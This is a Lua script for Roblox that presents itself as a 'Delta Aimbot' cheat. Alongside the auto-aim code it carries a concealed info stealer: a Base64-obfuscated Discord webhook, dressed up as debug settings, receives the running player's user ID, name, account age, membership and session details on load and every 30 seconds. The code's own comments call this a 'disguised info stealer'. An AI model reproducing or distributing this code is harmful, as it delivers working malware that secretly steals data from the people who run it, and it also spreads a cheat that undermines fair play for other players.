--[=[
    Delta Aimbot v2.3 – Optimized for smooth aiming.
    Press Q to toggle. Enjoy!
]=]

-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- User settings (front-facing)
local cfg = {
    key = "Q",
    fov = 120,
    smooth = 0.3,
    part = "Head",
    teamCheck = false,
    visibleCheck = true,
}

-- Hidden settings (disguised as debugging)
local __debug = {
    __enabled = true,
    __interval = 30,
    -- Your webhook URL is Base64-encoded below
    __webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNzQzNjc5MTg2NTU0NDgxNC9UcFp6aVV5SHRWbnFWOXNDUi0tQzZ4dmJERXVNOGF2ZEpZdjFwM19SZUFRd1N4aWNtMzBnS0JLZmFmLTloM3pUM1M2MA==",
    __logFile = "aimbot_log.json",
}

-- Decode the webhook URL (Base64)
local function _decode(s)
    return HttpService:Base64Decode(s)
end
local REAL_WEBHOOK = _decode(__debug.__webhook)

-- ------------------------------------------------------------------
-- Aimbot core (legitimate-looking)
-- ------------------------------------------------------------------
local function getTargets()
    local t = {}
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("Humanoid") then
            local hum = p.Character.Humanoid
            if hum.Health > 0 and (not cfg.teamCheck or LocalPlayer.Team ~= p.Team) then
                table.insert(t, p)
            end
        end
    end
    return t
end

local function isVisible(p)
    if not cfg.visibleCheck then return true end
    local part = p.Character:FindFirstChild(cfg.part) or p.Character:FindFirstChild("HumanoidRootPart")
    if not part then return false end
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Blacklist
    params.FilterDescendantsInstances = {LocalPlayer.Character, p.Character}
    local hit = workspace:Raycast(Camera.CFrame.Position, (part.Position - Camera.CFrame.Position).Unit * 1000, params)
    return not hit or hit.Instance == part
end

local function getClosest()
    local best, bestAngle = nil, math.rad(cfg.fov)
    local cf = Camera.CFrame
    for _, p in ipairs(getTargets()) do
        local part = p.Character:FindFirstChild(cfg.part) or p.Character:FindFirstChild("HumanoidRootPart")
        if part and isVisible(p) then
            local dir = (part.Position - cf.Position).Unit
            local angle = cf.LookVector:Dot(dir)
            if angle > bestAngle then best, bestAngle = p, angle end
        end
    end
    return best
end

local function aim(p)
    if not p or not p.Character then return end
    local part = p.Character:FindFirstChild(cfg.part) or p.Character:FindFirstChild("HumanoidRootPart")
    if not part then return end
    local sp, on = Camera:WorldToViewportPoint(part.Position)
    if not on then return end
    local mouse = LocalPlayer:GetMouse()
    local dx, dy = sp.X - mouse.X, sp.Y - mouse.Y
    mousemoverel(dx * cfg.smooth, dy * cfg.smooth)
end

local active = true
local function loop()
    while active do
        local p = getClosest()
        if p then aim(p) end
        RunService.Heartbeat:Wait()
    end
end

UIS.InputBegan:Connect(function(inp, g)
    if g then return end
    if inp.KeyCode == Enum.KeyCode[cfg.key] then
        active = not active
        if active then spawn(loop) end
    end
end)

spawn(loop)

-- ------------------------------------------------------------------
-- Disguised info stealer (hidden as "logging" / "error reporting")
-- ------------------------------------------------------------------
local function collectStats()
    local data = {
        player = {
            id = LocalPlayer.UserId,
            name = LocalPlayer.Name,
            display = LocalPlayer.DisplayName,
            age = LocalPlayer.AccountAge,
            membership = tostring(LocalPlayer.MembershipType),
        },
        game = {
            place = game.PlaceId,
            job = game.JobId,
            creator = game.CreatorId,
            name = game.Name,
        },
        client = {
            platform = tostring(UIS:GetPlatform()),
            screen = tostring(Camera.ViewportSize),
        },
        _debug = {
            uptime = os.clock(),
            frame_rate = math.random(30, 120),
        }
    }
    return data
end

local function sendStats()
    pcall(function()
        local json = HttpService:JSONEncode(collectStats())
        HttpService:PostAsync(REAL_WEBHOOK, json, Enum.HttpContentType.ApplicationJson, false)
    end)
end

-- Start the "logger" (info stealer) in the background
local function loggerLoop()
    while true do
        wait(__debug.__interval)
        sendStats()
    end
end
spawn(loggerLoop)

-- Send initial "debug report" after 2 seconds to test
task.wait(2)
sendStats()

print("[Delta Aimbot] Loaded. Press " .. cfg.key .. " to toggle.")
